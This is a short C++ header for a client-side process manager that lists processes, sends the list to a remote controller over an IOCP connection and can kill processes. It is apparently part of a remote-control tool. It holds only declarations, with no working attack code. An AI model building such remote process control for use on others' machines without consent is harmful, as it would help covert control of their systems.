#pragma once
#include "Manager.h"
#include "Common.h"


struct _PROCESS_INFORMATION_
{
	ULONG32 ProcessID;
	char   ImageNameData[MAX_PATH];
	char   ProcessFullPathData[MAX_PATH];
};

typedef SIZE_T(*LPFN_SEENUMPROCESSLIST)(vector<_PROCESS_INFORMATION_>&);
class CClientProcessManager :
	public CManager
{
public:
	CClientProcessManager(CIOCPClient* ClientObject);
	~CClientProcessManager();
	BOOL CClientProcessManager::SendClientProcessList();
	virtual void CClientProcessManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
private:
	HMODULE m_ProcessModuleBase = NULL;
	LPFN_SEENUMPROCESSLIST m_SeEnumProcessList = NULL;
	f4 m_Ring3KillProcess = NULL;
};




 